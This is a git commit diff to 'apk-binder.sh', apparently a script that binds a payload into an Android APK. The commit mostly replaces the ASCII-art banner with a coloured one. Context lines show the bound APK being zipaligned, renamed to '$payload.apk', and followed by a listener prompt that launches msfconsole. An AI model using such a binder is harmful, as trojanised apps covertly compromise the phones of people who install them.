5a116b699793a9bf81e8c3093402c5b50c4f75f4
Mohit Saran <48322980+kinghacker0@users.noreply.github.com>
2020-02-10 14:45:12 +0530

    Update apk-binder.sh

--- apk-binder.sh
+++ apk-binder.sh
@@ -2,11 +2,17 @@
 #Credit - Give me credit if you use any part of script
 
 #Banner Start
-echo -e "    ___        __       ___  _         __    "
-echo -e "   / _ | ___  / /______/ _ )(_)__  ___/ /__ ____ "
-echo -e "  / __ |/ _ \/  '_/___/ _  / / _ \/ _  / -_) __/  "
-echo -e " /_/ |_/ .__/_/\_\   /____/_/_//_/\_,_/\__/_/     "
-echo -e "      /_/                                       "
+echo -e "\e[31m                                                              \e[0m"
+echo -e "\e[31m ▄▄▄       ██▓███   ██ ▄█▀ ▄▄▄▄    ██▓ ███▄    █ ▓█████▄ ▓█████  ██▀███  \e[0m";
+echo -e "\e[31m▒████▄    ▓██░  ██▒ ██▄█▒ ▓█████▄ ▓██▒ ██ ▀█   █ ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒\e[0m";
+echo -e "\e[31m▒██  ▀█▄  ▓██░ ██▓▒▓███▄░ ▒██▒ ▄██▒██▒▓██  ▀█ ██▒░██   █▌▒███   ▓██ ░▄█ ▒\e[0m";
+echo -e "\e[31m░██▄▄▄▄██ ▒██▄█▓▒ ▒▓██ █▄ ▒██░█▀  ░██░▓██▒  ▐▌██▒░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  \e[0m";
+echo -e "\e[31m ▓█   ▓██▒▒██▒ ░  ░▒██▒ █▄░▓█  ▀█▓░██░▒██░   ▓██░░▒████▓ ░▒████▒░██▓ ▒██▒\e[0m";
+echo -e "\e[31m ▒▒   ▓▒█░▒▓▒░ ░  ░▒ ▒▒ ▓▒░▒▓███▀▒░▓  ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░\e[0m";
+echo -e "\e[31m  ▒   ▒▒ ░░▒ ░     ░ ░▒ ▒░▒░▒   ░  ▒ ░░ ░░   ░ ▒░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░\e[0m";
+echo -e "\e[31m  ░   ▒   ░░       ░ ░░ ░  ░    ░  ▒ ░   ░   ░ ░  ░ ░  ░    ░     ░░   ░ \e[0m";
+echo -e "\e[31m      ░  ░         ░  ░    ░       ░           ░    ░       ░  ░   ░     \e[0m";
+echo -e "\e[31m                                ░                 ░                      \e[0m";
 echo -e " Author  = github.com/kinghacker0               "
 echo -e "\e[34m Website = hackersking.in              \e[0m "
 echo -e "\e[49m                                 \e[2m"
@@ -26,7 +32,7 @@ zipalign -v 4 binded.apk binded-signed.apk
 
 #listner start
 rm binded.apk && mv binded-signed.apk $payload.apk
-echo "                                                "
-read -p "\e[34m[-]Start listner(Enter) or Close (Ctrl+c) : \e[2m" listner
+echo "\e[34m                                                \e[2m"
+read -p "[-]Start listner(Enter) or Close (Ctrl+c) : " listner
 msfconsole
 #Changing this banner doesn't make you programmer..!"
